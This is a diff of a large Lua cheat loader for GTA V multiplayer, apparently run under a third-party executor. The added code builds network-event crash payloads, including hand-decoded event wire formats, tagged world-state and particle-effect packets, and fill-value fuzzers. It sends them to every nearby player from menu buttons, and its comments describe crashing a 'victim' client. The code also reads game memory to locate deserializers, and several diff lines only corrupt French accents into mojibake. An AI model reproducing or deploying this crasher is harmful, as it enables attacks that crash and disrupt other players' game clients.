     NetworkRegisterEntityAsNetworked(obj)
 
-    -- Bone SKEL_Head (tÃªte) pour l'effet ridicule
+    -- Bone SKEL_Head (tÃƒÂªte) pour l'effet ridicule
     local boneIndex = GetPedBoneIndex(targetPed, 31086) -- SKEL_Head
 
-    -- Attach sur la tÃªte du joueur ciblÃ©
-    -- Offsets : X=0 centrÃ©, Y=0 centrÃ©, Z=0.2 lÃ©gÃ¨rement au-dessus
+    -- Attach sur la tÃƒÂªte du joueur ciblÃƒÂ©
+    -- Offsets : X=0 centrÃƒÂ©, Y=0 centrÃƒÂ©, Z=0.2 lÃƒÂ©gÃƒÂ¨rement au-dessus
     AttachEntityToEntity(
         obj, targetPed,
         boneIndex,
-        0.0, 0.0, 0.2,    -- offset X, Y, Z (au-dessus de la tÃªte)
+        0.0, 0.0, 0.2,    -- offset X, Y, Z (au-dessus de la tÃƒÂªte)
         0.0, 0.0, 0.0,    -- rotation
         true,   -- p9
-        true,   -- useSoftPinning (reste attachÃ© quand le joueur bouge)
-        false,  -- collision OFF (Ã©vite que l'objet pousse le joueur)
-        true,   -- isPed = true (attachÃ© Ã  un ped)
+        true,   -- useSoftPinning (reste attachÃƒÂ© quand le joueur bouge)
+        false,  -- collision OFF (ÃƒÂ©vite que l'objet pousse le joueur)
+        true,   -- isPed = true (attachÃƒÂ© ÃƒÂ  un ped)
         0,      -- vertexIndex
         true    -- fixedRot
     )
@@ -19913,7 +19913,7 @@ local WINDOWS = {
     emote = { min = 0.0,  max = 400.0 },
 }
 
--- Ped flood. The Danté/HydraModz reference is the only client-side crasher in
+-- Ped flood. The DantÃ©/HydraModz reference is the only client-side crasher in
 -- the corpus with a green-crash gate: 200 player model peds with grenade
 -- launchers, sixty networked props, and a 250 m minimum distance. The weapon
 -- and the gate are the two ingredients the previous passive ring lacked.
@@ -20748,7 +20748,7 @@ function C.cleanup()
 end
 
 -- ---------------------------------------------------------------------------
--- SELF EMOTE (the Net crash row) — instant, invisible
+-- SELF EMOTE (the Net crash row) â€” instant, invisible
 --
 -- Dump evidence: the victim saw the attacker drop forward and "lie down"
 -- instantly, with no animation played. That is a single TaskPlayAnim whose
@@ -20963,8 +20963,8 @@ function C.launch(kind)
     -- Green-crash gate. Below 250 m the operator renders the swarm and the
     -- impacts; the reference refuses the crash there for that reason.
     if kind == "ped" and target.dist < PED.minDist then
-        O.log("crash: target %.0f m, need %.0f m — move back", target.dist, PED.minDist)
-        pcall(Notify, ("Ped flood: target %.0f m — move back to %.0f m"):format(
+        O.log("crash: target %.0f m, need %.0f m â€” move back", target.dist, PED.minDist)
+        pcall(Notify, ("Ped flood: target %.0f m â€” move back to %.0f m"):format(
             target.dist, PED.minDist))
         return false
     end
@@ -22531,6 +22531,195 @@ local NET = (function(O, C)
         return NET.oob(eventId, hash, ids, data)
     end
 
+    -- Name hash per wire id, straight out of netreg.ssn (build 3751). The
+    -- dispatcher resolves the handler from the hash but forwards the id to the
+    -- handler, so a payload needs both and they must belong together. Ids 9,
+    -- 10 and 87..90 are registered with no handler (hash B16BF81F, fn 0).
+    NET.EV = {
+        [0] = 0x9CFF54F6, 0xE2353810, 0xAAB41E6F, 0x672C540D, 0x6C7ED2E7,
+        0x28FB6CD3, 0xA3CE52FD, 0xE173176D, 0xEA23DEF4, 0xB16BF81F,
+        0xB16BF81F, 0xBD1355C7, 0xF4A0EF99, 0xF9214D84, 0x96409610,
+        0x2AC5BF6D, 0xEB59AF4A, 0xFA3ABE0E, 0xC2BCC349, 0x9576B0A3,
+        0xC3B0BDDB, 0x661C8571, 0x9CF8A204, 0xD525AAFF, 0x37C7FB68,
+        0x5BA4ED9D, 0xA6CCCD6A, 0x9832C9FA, 0xCDE489F2, 0x0516053F,
+        0x629BBB0A, 0xB616D7C7, 0x4A05BE33, 0xC00B8EB5, 0xF221BAEF,
+        0x82F5F0FF, 0x7FAD02DC, 0x5FA50E3D, 0x3F662691, 0x84079E73,
+        0xEFB69338, 0xB6E8D2A3, 0xDF555EBF, 0x18C850B0, 0x20E73685,
+        0x3192DF2D, 0xAED6EF90, 0x5921BCE3, 0x5037EA89, 0x716DF948,
+        0x5C239542, 0xF0CE74EE, 0xCC87BC28, 0x9D579F2A, 0x5B356FC8,
+        0x86146EF7, 0x39DAF249, 0x74FA708E, 0x3C0AF3A4, 0xD6B974C7,
+        0x91016504, 0xACA11BB2, 0x884B69CA, 0xDE5B353A, 0xDC94C828,
+        0x4591A6B8, 0xEC406753, 0x9E36A2FF, 0xAC37297C, 0x0F48FB40,
+        0x2FFB857E, 0x3A48A28D, 0x40366FE1, 0x5475252E, 0xABD06449,
+        0x0A8C49B2, 0xC1286D5E, 0x92B0F3DA, 0x7A03C5A6, 0x694F498B,
+        0xD8BE5236, 0x2A7695D3, 0x9EE76D23, 0x5E70685A, 0x4FB72690,
+        0x76C0048E, 0x2418A98E, 0xB16BF81F, 0xB16BF81F, 0xB16BF81F,
+        0xB16BF81F,
+    }
+
+    -- Event names, recovered by hashing every upper-case token in GTA5.exe
+    -- against the registry in netreg.ssn. 85 of the 91 slots resolve; 9, 10 and
+    -- 87..90 share one hash and are registered with no handler at all.
+    NET.NAMES = {
+        [0] = "OBJECT_ID_FREED_EVENT",
+        [1] = "OBJECT_ID_REQUEST_EVENT",
+        [2] = "ARRAY_DATA_VERIFY_EVENT",
+        [3] = "SCRIPT_ARRAY_DATA_VERIFY_EVENT",
+        [4] = "REQUEST_CONTROL_EVENT",
+        [5] = "GIVE_CONTROL_EVENT",
+        [6] = "WEAPON_DAMAGE_EVENT",
+        [7] = "REQUEST_PICKUP_EVENT",
+        [8] = "REQUEST_MAP_PICKUP_EVENT",
+        [11] = "RESPAWN_PLAYER_PED_EVENT",
+        [12] = "GIVE_WEAPON_EVENT",
+        [13] = "REMOVE_WEAPON_EVENT",
+        [14] = "REMOVE_ALL_WEAPONS_EVENT",
+        [15] = "VEHICLE_COMPONENT_CONTROL_EVENT",
+        [16] = "FIRE_EVENT",
+        [17] = "EXPLOSION_EVENT",
+        [18] = "START_PROJECTILE_EVENT",
+        [19] = "UPDATE_PROJECTILE_TARGET_EVENT",
+        [20] = "REMOVE_PROJECTILE_ENTITY_EVENT",
+        [21] = "BREAK_PROJECTILE_TARGET_LOCK_EVENT",
+        [22] = "ALTER_WANTED_LEVEL_EVENT",
+        [23] = "CHANGE_RADIO_STATION_EVENT",
+        [24] = "RAGDOLL_REQUEST_EVENT",
+        [25] = "PLAYER_TAUNT_EVENT",
+        [26] = "PLAYER_CARD_STAT_EVENT",
+        [27] = "DOOR_BREAK_EVENT",
+        [28] = "SCRIPTED_GAME_EVENT",
+        [29] = "REMOTE_SCRIPT_INFO_EVENT",
+        [30] = "REMOTE_SCRIPT_LEAVE_EVENT",
+        [31] = "MARK_AS_NO_LONGER_NEEDED_EVENT",
+        [32] = "CONVERT_TO_SCRIPT_ENTITY_EVENT",
+        [33] = "SCRIPT_WORLD_STATE_EVENT",
+        [34] = "CLEAR_AREA_EVENT",
+        [35] = "CLEAR_RECTANGLE_AREA_EVENT",
+        [36] = "NETWORK_REQUEST_SYNCED_SCENE_EVENT",
+        [37] = "NETWORK_START_SYNCED_SCENE_EVENT",
+        [38] = "NETWORK_STOP_SYNCED_SCENE_EVENT",
+        [39] = "NETWORK_UPDATE_SYNCED_SCENE_EVENT",
+        [40] = "INCIDENT_ENTITY_EVENT",
+        [41] = "GIVE_PED_SCRIPTED_TASK_EVENT",
+        [42] = "GIVE_PED_SEQUENCE_TASK_EVENT",
+        [43] = "NETWORK_CLEAR_PED_TASKS_EVENT",
+        [44] = "NETWORK_START_PED_ARREST_EVENT",
+        [45] = "NETWORK_START_PED_UNCUFF_EVENT",
+        [46] = "NETWORK_SOUND_CAR_HORN_EVENT",
+        [47] = "NETWORK_ENTITY_AREA_STATUS_EVENT",
+        [48] = "NETWORK_GARAGE_OCCUPIED_STATUS_EVENT",
+        [49] = "PED_CONVERSATION_LINE_EVENT",
+        [50] = "SCRIPT_ENTITY_STATE_CHANGE_EVENT",
+        [51] = "NETWORK_PLAY_SOUND_EVENT",
+        [52] = "NETWORK_STOP_SOUND_EVENT",
+        [53] = "NETWORK_PLAY_AIRDEFENSE_FIRE_EVENT",
+        [54] = "NETWORK_BANK_REQUEST_EVENT",
+        [55] = "NETWORK_AUDIO_BARK_EVENT",
+        [56] = "REQUEST_DOOR_EVENT",
+        [57] = "NETWORK_TRAIN_REPORT_EVENT",
+        [58] = "NETWORK_TRAIN_REQUEST_EVENT",
+        [59] = "NETWORK_INCREMENT_STAT_EVENT",
+        [60] = "MODIFY_VEHICLE_LOCK_WORD_STATE_DATA",
+        [61] = "MODIFY_PTFX_WORD_STATE_DATA_SCRIPTED_EVOLVE_EVENT",
+        [62] = "REQUEST_PHONE_EXPLOSION_EVENT",
+        [63] = "REQUEST_DETACHMENT_EVENT",
+        [64] = "KICK_VOTES_EVENT",
+        [65] = "GIVE_PICKUP_REWARDS_EVENT",
+        [66] = "BLOW_UP_VEHICLE_EVENT",
+        [67] = "NETWORK_SPECIAL_FIRE_EQUIPPED_WEAPON",
+        [68] = "NETWORK_RESPONDED_TO_THREAT_EVENT",
+        [69] = "NETWORK_SHOUT_TARGET_POSITION",
+        [70] = "VOICE_DRIVEN_MOUTH_MOVEMENT_FINISHED_EVENT",
+        [71] = "PICKUP_DESTROYED_EVENT",
+        [72] = "UPDATE_PLAYER_SCARS_EVENT",
+        [73] = "NETWORK_CHECK_EXE_SIZE_EVENT",
+        [74] = "NETWORK_PTFX_EVENT",
+        [75] = "NETWORK_PED_SEEN_DEAD_PED_EVENT",
+        [76] = "REMOVE_STICKY_BOMB_EVENT",
+        [77] = "NETWORK_CHECK_CODE_CRCS_EVENT",
+        [78] = "INFORM_SILENCED_GUNSHOT_EVENT",
+        [79] = "PED_PLAY_PAIN_EVENT",
+        [80] = "CACHE_PLAYER_HEAD_BLEND_DATA_EVENT",
+        [81] = "REMOVE_PED_FROM_PEDGROUP_EVENT",
+        [82] = "REPORT_MYSELF_EVENT",
+        [83] = "REPORT_CASH_SPAWN_EVENT",
+        [84] = "ACTIVATE_VEHICLE_SPECIAL_ABILITY_EVENT",
+        [85] = "BLOCK_WEAPON_SELECTION",
+        [86] = "NETWORK_CHECK_CATALOG_CRC",
+    }
+
+    -- NETWORK_PTFX (id 74), decoded field by field from its Read at 0x116AFD0:
+    --
+    --   32 hashA -> +0x54      32 hashB -> +0x58
+    --   19 enumA -> +0x30      19 enumB -> +0x40
+    --   10 -> +0x60  (scaled float)
+    --    3 -> +0x68
+    --    1, if 1 then 13 -> +0x50
+    --    1, if 1 then 32 -> +0x5c   (through a virtual sub-reader)
+    --    1, if 1 then 8,8,8 -> +0x69..+0x6b
+    --    1, if 1 then 8 -> +0x64    (scaled float)
+    --
+    -- Every conditional field is forced present, so the payload is a fixed
+    -- 140 bits and the receiver never sees a stream that stops mid-field.
+    -- Apply (0x117C3DC) buckets hashB modulo a global table size, walks the
+    -- chain, then hands hashA, both enums, +0x5c, +0x60 and +0x68 to the
+    -- engine's PtFx start (0x17105B8) together with the object resolved from
+    -- the 13-bit id. A hash that names a DLC asset is what forces the
+    -- CExtraContentWrapper::INIT__SESSION path seen in the victim crash.
+    function NET.ptfx(o)
+        o = type(o) == "table" and o or {}
+        return {
+            { bits = 32, val = tonumber(o.hashA) or 0 },
+            { bits = 32, val = tonumber(o.hashB) or 0 },
+            { bits = 19, val = tonumber(o.enumA) or 0 },
+            { bits = 19, val = tonumber(o.enumB) or 0 },
+            { bits = 10, val = tonumber(o.s10) or 0 },
+            { bits = 3,  val = tonumber(o.s3) or 0 },
+            { bits = 1,  val = 1 }, { bits = 13, val = tonumber(o.ptfxId) or 0 },
+            { bits = 1,  val = 1 }, { bits = 32, val = tonumber(o.ext) or 0 },
+            { bits = 1,  val = 1 },
+            { bits = 8,  val = tonumber(o.r) or 255 },
+            { bits = 8,  val = tonumber(o.g) or 255 },
+            { bits = 8,  val = tonumber(o.b) or 255 },
+            { bits = 1,  val = 1 }, { bits = 8, val = tonumber(o.s8) or 0 },
+        }
+    end
+
+    -- joaat, the hash the client uses for asset and effect names.
+    --
+    -- Written with arithmetic only: the loader has to parse under whatever Lua
+    -- the executor ships, and a binary `~` would be a syntax error on 5.1 while
+    -- the 5.4-only shift operators are no safer. A 32-bit xor over bit pairs is
+    -- slow in the abstract and irrelevant here: names are 30 chars at most.
+    local function bxor32(a, b)
+        local r, bit = 0, 1
+        for _ = 1, 32 do
+            local x = a % 2
+            local y = b % 2
+            if x ~= y then r = r + bit end
+            a = (a - x) / 2
+            b = (b - y) / 2
+            bit = bit * 2
+        end
+        return r
+    end
+
+    local M32 = 4294967296
+
+    function NET.joaat(text)
+        local h = 0
+        text = tostring(text or "")
+        for i = 1, #text do
+            h = (h + text:byte(i)) % M32
+            h = (h + (h * 1024) % M32) % M32
+            h = bxor32(h, math.floor(h / 64))
+        end
+        h = (h + (h * 8) % M32) % M32
+        h = bxor32(h, math.floor(h / 2048))
+        h = (h + (h * 32768) % M32) % M32
+        return h
+    end
+
     -- Arbitrary read, so a global table can be measured before and after a
     -- payload instead of guessed at. `rva` is relative to the GTA5.exe image
     -- base, the coordinate system every address in this file is written in.
@@ -22547,12 +22736,26 @@ local NET = (function(O, C)
         if type(m.Module) == "function" then
             local ok, g = pcall(m.Module, "gta-net-five.dll")
             if ok and type(g) == "number" and g > 0x10000 then
-                local delta = read_u64(g + REG_GTA_DELTA) or 0
-                if delta > 0x10000 and delta < 0x20000000 then
-                    cachedBase = delta + 0x140000000
-                    return cachedBase
+                local delta = read_u64(g + REG_GTA_DELTA)
+                -- The image is genuinely ASLR'd: netreg.ssn reports
+                -- gbase = 0x7FF686B40000, so delta is 0x7EB286B40000, not a
+                -- small number. The earlier `delta < 0x20000000` bound was
+                -- wrong and rejected the only good answer 19 times. Bound the
+                -- *result* instead: a user-mode image base lives in the same
+                -- band as the module handles, well above 4 GiB.
+                if type(delta) == "number" then
+                    local base = delta + 0x140000000
+                    if base > 0x100000000 and base < 0x7FFFFFFF0000 then
+                        cachedBase = base
+                        return cachedBase
+                    end
                 end
             end
+        end
+        local t = NET.regTable()
+        if t and type(t.gbase) == "number" and t.gbase > 0x10000 then
+            cachedBase = t.gbase
+            return cachedBase
         end
         for _, name in ipairs({ "GTA5.exe", "GTA5" }) do
             if type(m.Module) == "function" then
@@ -22601,6 +22804,92 @@ local NET = (function(O, C)
         local base = gta_base()
         if not base then O.log("net read: GTA5.exe base unavailable"); return false end
         return NET.rdump(name, base + math.floor(tonumber(rva) or 0), len)
+    end
+
+    -- The whole world-state chain in one click.
+    --
+    -- The 9 type factories live in a table at 0x2A2BC60, but that RVA is past
+    -- the .data raw size (0x1D1A000 + 0x19A000 = 0x1EB4000), so it is zero on
+    -- disk and filled at startup: only the live process has it. Each factory
+    -- opens with `lea rX,[rip+vtable]`, which yields the class vtable, and the
+    -- vtable slot +0x78 is the payload deserializer that 0x116BBFC calls as
+    -- soon as a SCRIPT_WORLD_STATE_EVENT arrives. Resolving factory -> vtable
+    -- -> deserializer here turns three separate dump rounds into one, and it
+    -- lands exactly on the code that parses an attacker payload.
+    local WS_TABLE_RVA = 0x2A2BC60
+    local WS_TYPES = 9
+    local WS_SLOT_READ = 0x78
+
+    local function le_i32(bytes, i)
+        local v = 0
+        for k = 0, 3 do
+            local byte = bytes[i + k]
+            if type(byte) ~= "number" then return nil end
+            v = v + (byte % 256) * (2 ^ (8 * k))
+        end
+        if v >= 0x80000000 then v = v - 0x100000000 end
+        return v
+    end
+
+    local function hex_line(bytes)
+        local t = {}
+        for i = 1, #bytes do
+            t[#t + 1] = string.format("%02X", (bytes[i] or 0) % 256)
+        end
+        return table.concat(t)
+    end
+
+    -- `lea rX,[rip+disp32]` is 48 8D /r with modrm.mod = 00 and rm = 101.
+    local function first_rip_lea(bytes, origin)
+        local last = math.min(#bytes, 0x60) - 6
+        for p = 1, last do
+            if bytes[p] == 0x48 and bytes[p + 1] == 0x8D then
+                local modrm = bytes[p + 2]
+                if modrm == 0x05 or modrm == 0x0D or modrm == 0x15 or modrm == 0x1D then
+                    local d = le_i32(bytes, p + 3)
+                    if d then
+                        local target = origin + (p - 1) + 7 + d
+                        if target > 0x10000 then return target end
+                    end
+                end
+            end
+        end
+        return nil
+    end
+
+    function NET.wsTable()
+        local base = gta_base()
+        if not base then O.log("net ws: GTA5.exe base unavailable"); return false end
+        local m = mem()
+        if not m or type(m.ReadBytes) ~= "function" then return false end
+        local lines = { string.format("base=%X table=%X", base, base + WS_TABLE_RVA) }
+        local found = 0
+        for i = 0, WS_TYPES - 1 do
+            local ctor = raw_u64(base + WS_TABLE_RVA + i * 8) or 0
+            if ctor > 0x10000 then
+                found = found + 1
+                local okc, code = pcall(m.ReadBytes, ctor, 0x100)
+                if okc and type(code) == "table" and #code >= 16 then
+                    lines[#lines + 1] = string.format("C %d %X %s", i, ctor - base, hex_line(code))
+                    local vt = first_rip_lea(code, ctor)
+                    if vt then
+                        local deser = raw_u64(vt + WS_SLOT_READ) or 0
+                        lines[#lines + 1] = string.format("V %d %X %X",
+                            i, vt - base, deser > 0x10000 and (deser - base) or 0)
+                        if deser > 0x10000 then
+                            local okd, dc = pcall(m.ReadBytes, deser, 0x200)
+                            if okd and type(dc) == "table" and #dc >= 16 then
+                                lines[#lines + 1] = string.format("R %d %X %s",
+                                    i, deser - base, hex_line(dc))
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        pcall(function() return Susano.WriteFile("netws.ssn", table.concat(lines, "\n")) end)
+        O.log("net ws: %d factories resolved -> netws.ssn", found)
+        return true
     end
 
     -- Dump the first bytes of every event handler. The code of GTA5.exe is
@@ -22689,8 +22978,13 @@ local NET = (function(O, C)
             { 0x10A6000, 0x10A8000  }, -- 0x10A6388 world-state factory
             { 0x10AD000, 0x10B0000  }, -- 0x10ADFD0, 0x10AEAF C explosion helpers
             { 0x10B7000, 0x10B9000  }, -- 0x10B7AD8 descriptor -> object
-            { 0x1178000, 0x117B000  }, -- world-state sub-deserializers (0x1179000
-                                       -- opens mid-function, so start earlier)
+            { 0x1178000, 0x117C000  }, -- world-state / entity-state sub objects.
+                                       -- 0x117A9D8 is the entity-state factory the
+                                       -- id 50 Read calls; the world-state ctors sit
+                                       -- in the same block.
+            { 0x1000,    0x2000     }, -- live .text head: the first .pdata entry
+                                       -- is 0x1068..0x12A0 and the crash lands at
+                                       -- 0x140001010, i.e. inside that page.
 
             -- Phase 1, already collected but kept last so a fresh profile gets
             -- a self-contained dump: every per-event vtable slot +0x28 (Write)
@@ -23043,6 +23337,185 @@ local NET = (function(O, C)
             end
         end
         return best
+    end
+
+    -- Every active player we can see inside `radius`, as server ids. The crash
+    -- lane needs the list twice (blind payload set, typed world-state sweep), so
+    -- it lives here instead of inline.
+    local function crashIds(radius)
+        local me = PlayerPedId()
+        if type(me) ~= "number" or me == 0 then return {} end
+        local my = GetEntityCoords(me)
+        local mySid = GetPlayerServerId(PlayerId())
+        local ids = {}
+        for _, p in ipairs(GetActivePlayers()) do
+            if p ~= PlayerId() then
+                local ped = GetPlayerPed(p)
+                if DoesEntityExist(ped) then
+                    local c = GetEntityCoords(ped)
+                    local dx = (c.x or 0) - (my.x or 0)
+                    local dy = (c.y or 0) - (my.y or 0)
+                    local dz = (c.z or 0) - (my.z or 0)
+                    if math.sqrt(dx * dx + dy * dy + dz * dz) <= (radius or 200.0) then
+                        local sid = GetPlayerServerId(p)
+                        if type(sid) == "number" and sid >= 0 and sid < 1024
+                           and sid ~= mySid then
+                            ids[#ids + 1] = sid
+                        end
+                    end
+                end
+            end
+        end
+        return ids
+    end
+
+    -- SCRIPT_WORLD_STATE_EVENT is the only event whose payload is a tagged
+    -- union: 4 bits of world-state type, 1 bit flag, then whatever that type's
+    -- deserializer consumes. The old crash set spent its first byte on raw
+    -- guesses, so 6 of the 8 variants decoded as type 0 and one as type 15 -
+    -- which 0x10A6388 rejects outright (it returns NULL above 8). This emits
+    -- the tag explicitly so the 9 reachable types can be swept one at a time
+    -- and a victim crash message can be matched to a type.
+    function NET.wsSend(t, fill, n)
+        t = math.floor(tonumber(t) or 0) % 9
+        fill = math.floor(tonumber(fill) or 0) % 256
+        n = math.floor(tonumber(n) or 48)
+        local data = NET.bits({ { bits = 4, val = t }, { bits = 1, val = 1 } })
+        if type(data) ~= "table" then return false end
+        for _ = 1, n do data[#data + 1] = fill end
+        local ids = crashIds(200.0)
+        if #ids == 0 then
+            O.log("net ws: no player in 200 m")
+            return false
+        end
+        local list = {}
+        for i = 1, #ids do list[i] = tostring(ids[i]) end
+        O.log("net ws: type %d fill %02X %d bytes -> %d [%s]",
+              t, fill, n, #ids, table.concat(list, ","))
+        return NET.emitEvent(ids, 0xC00B8EB5, 33, data)
+    end
+
+    -- NETWORK_PTFX probe. The effect is resolved from hashB through a global
+    -- bucket table and hashA goes straight into the PtFx start, so the two
+    -- variants worth separating are "nothing resolves" (both zero) and "an
+    -- asset name that exists" (joaat of a core effect asset). A DLC-resolved
+    -- asset is the path that reaches CExtraContentWrapper::INIT__SESSION, which
+    -- is the class named in the victim crash.
+    function NET.ptfxProbe(which)
+        local ids = crashIds(200.0)
+        if #ids == 0 then
+            O.log("net ptfx: no player in 200 m")
+            return false
+        end
+        which = math.floor(tonumber(which) or 0) % 4
+        local core = NET.joaat("core")
+        local opts
+        if which == 0 then
+            opts = { hashA = 0, hashB = 0, enumA = 0, enumB = 0 }
+        elseif which == 1 then
+            opts = { hashA = 0xFFFFFFFF, hashB = 0xFFFFFFFF, enumA = 0x7FFFF, enumB = 0x7FFFF }
+        elseif which == 2 then
+            opts = { hashA = core, hashB = core }
+        else
+            opts = { hashA = 0, hashB = core }
+        end
+        local data = NET.bits(NET.ptfx(opts))
+        if type(data) ~= "table" then return false end
+        local list = {}
+        for i = 1, #ids do list[i] = tostring(ids[i]) end
+        O.log("net ptfx: v%d hashA=%08X hashB=%08X %d bytes -> %d [%s]",
+              which, opts.hashA, opts.hashB, #data, #ids, table.concat(list, ","))
+        return NET.emitEvent(ids, NET.EV[74], 74, data)
+    end
+
+    -- Field widths, in wire order, for the handlers whose whole read chain
+    -- resolved inside the dumped window. Each number is one Read call in the
+    -- handler's body, recovered from the disassembly and matched against the
+    -- pdata bounds of the function. Handlers that delegate to a helper outside
+    -- the window, or that read inside a loop, are deliberately absent: a wrong
+    -- width desynchronises the stream and the receiver would be parsing
+    -- whatever follows, which tells us nothing about the event itself.
+    NET.W = {
+        [4]  = "13,32,13,13,1",
+        [7]  = "13,13,1",
+        [15] = "13,13,5,1,1,13",
+        [19] = "13,32,4",
+        [20] = "13,32",
+        [21] = "16",
+        [23] = "13,8",
+        [24] = "13,32,13,13,1",
+        [27] = "13,3",
+        [34] = "19,15,11",
+        [35] = "19,19",
+        [36] = "32,13,13,1",
+        [38] = "32,13,13,1",
+        [39] = "32,8",
+        [43] = "13,1",
+        [48] = "8,32",
+        [52] = "8,32,32",
+        [53] = "32,19",
+        [59] = "32,32",
+        [60] = "8,32,32,1",
+        [61] = "32,32,32",
+        [62] = "13,32,13,13,1",
+        [63] = "13,32,13,13,1",
+        [65] = "3,32",
+        [66] = "13,13,32,1,1",
+        [68] = "4,13,13,13",
+        [69] = "4,13,13,13",
+        [74] = "32,32,19,19,10,3,1,13,1,32,1,8,8,8,1,8",
+        [76] = "3,16",
+        [78] = "13,19,19,32,1",
+        [79] = "3,13,6,8",
+        [82] = "32,32",
+        [84] = "13,3",
+        [85] = "13,1",
+    }
+
+    function NET.widths(id)
+        local s = NET.W[tonumber(id) or -1]
+        if not s then return nil end
+        local t = {}
+        for w in s:gmatch("%d+") do t[#t + 1] = tonumber(w) end
+        if #t == 0 then return nil end
+        return t
+    end
+
+    -- Build a payload that matches the receiver's own read order exactly and
+    -- fills every field with one repeated value. Fill 0 gives a well-formed
+    -- empty event, 0xFF a well-formed event with every field at its ceiling.
+    function NET.evBlob(id, fill)
+        local ws = NET.widths(id)
+        if not ws then return nil end
+        local v = tonumber(fill) or 0
+        local spec = {}
+        for i = 1, #ws do spec[i] = { bits = ws[i], val = v } end
+        return spec
+    end
+
+    function NET.evSend(id, fill)
+        id = tonumber(id) or 0
+        local ids = crashIds(200.0)
+        if #ids == 0 then
+            O.log("net ev: no player in 200 m")
+            return false
+        end
+        if not NET.EV[id] then
+            O.log("net ev: id %d is registered with no handler", id)
+            return false
+        end
+        local spec = NET.evBlob(id, fill)
+        if not spec then
+            O.log("net ev: no width table for id %d", id)
+            return false
+        end
+        local data = NET.bits(spec)
+        if type(data) ~= "table" then return false end
+        local list = {}
+        for i = 1, #ids do list[i] = tostring(ids[i]) end
+        O.log("net ev: id %d (%s) fill 0x%02X %d bytes -> %d [%s]",
+              id, NET.NAMES[id] or "?", fill & 0xFF, #data, #ids, table.concat(list, ","))
+        return NET.emitEvent(ids, NET.EV[id], id, data)
     end
 
     function NET.crash()
@@ -24672,7 +25145,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r14 (image base + world-state table)")
+    O.log("loader build 2026-10-29-r18 (names, width table, ev sender)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -24827,7 +25300,7 @@ local _weapons = {
         {n="Gusenberg",          h="WEAPON_GUSENBERG"},
         {n="Minigun",            h="WEAPON_MINIGUN"},
     }},
-    {cat=" Corps-à-corps", items={
+    {cat=" Corps-Ã -corps", items={
         {n="Knife",              h="WEAPON_KNIFE"},
         {n="Nightstick",         h="WEAPON_NIGHTSTICK"},
         {n="Hammer",             h="WEAPON_HAMMER"},
@@ -24912,8 +25385,8 @@ local function _giveWeapon(weaponHash, ammo)
     end
 end
 
-local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'Catégories')
-local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'Résultats')
+local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'CatÃ©gories')
+local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'RÃ©sultats')
 local _catMenus     = {}
 
 for i = 1, #_weapons do
@@ -24922,16 +25395,16 @@ for i = 1, #_weapons do
 
     for j = 1, #catData.items do
         local w = catData.items[j]
-        catMenu:AddButton(w.n):SetRightText('→'):on('buttonPress', function()
+        catMenu:AddButton(w.n):SetRightText('â†’'):on('buttonPress', function()
             _giveWeapon(w.h, 9999)
         end)
     end
 
     _catMenus[i] = catMenu
-    _wepMenu:AddSubmenu(catMenu):SetRightText('➤')
+    _wepMenu:AddSubmenu(catMenu):SetRightText('âž¤')
 end
 
-_wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
+_wepMenu:AddButton('ðŸ”Ž Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
     local inputBox = SEED.Classes.InputBox('Nom de l\'arme (ex: pistol, rifle...)', { maxCharacters = 60 })
     inputBox:on('confirmed', function(result)
         if not result or result == '' then return end
@@ -24947,7 +25420,7 @@ _wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-g
                 local w = catData.items[j]
                 if w.n:lower():find(search, 1, true) or w.h:lower():find(search, 1, true) then
                     found = found + 1
-                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('→'):on('buttonPress', function()
+                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('â†’'):on('buttonPress', function()
                         _giveWeapon(w.h, 9999)
                     end)
                 end
@@ -24955,7 +25428,7 @@ _wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-g
         end
 
         if found == 0 then
-            _wepSearchMenu:AddButton('Aucun résultat.')
+            _wepSearchMenu:AddButton('Aucun rÃ©sultat.')
         end
 
         _wepSearchMenu:Refresh()
@@ -32099,6 +32572,47 @@ local function installCrasher()
             type = "action",
             onClick = function()
                 NET.rdumpRva("netws", 0x2A2BC60, 9 * 8)
+            end,
+        },
+        {
+            name = "Net code",
+            type = "action",
+            onClick = function()
+                NET.rdumpRva("netcode", 0x1000, 0x1000)
+            end,
+        },
+        {
+            name = "Ws type",
+            type = "action",
+            onClick = function()
+                NET.wsProbe = ((NET.wsProbe or -1) + 1) % 9
+                NET.wsSend(NET.wsProbe, 0x00, 48)
+            end,
+        },
+        {
+            name = "Ws fuzz",
+            type = "action",
+            onClick = function()
+                NET.wsProbe = ((NET.wsProbe or -1) + 1) % 9
+                NET.wsSend(NET.wsProbe, 0xFF, 48)
+            end,
+        },
+        {
+            name = "Net ptfx",
+            type = "action",
+            onClick = function()
+                NET.ptfxVar = ((NET.ptfxVar or -1) + 1) % 4
+                NET.ptfxProbe(NET.ptfxVar)
+            end,
+        },
+        {
+            name = "Net ev",
+            type = "action",
+            onClick = function()
+                local seq = { 61, 60, 66, 34, 53, 79, 78, 15, 35, 43 }
+                NET.evIdx = ((NET.evIdx or 0) % #seq) + 1
+                NET.evFill = (NET.evFill == 0xFF) and 0 or 0xFF
+                NET.evSend(seq[NET.evIdx], NET.evFill)
             end,
         },
     }
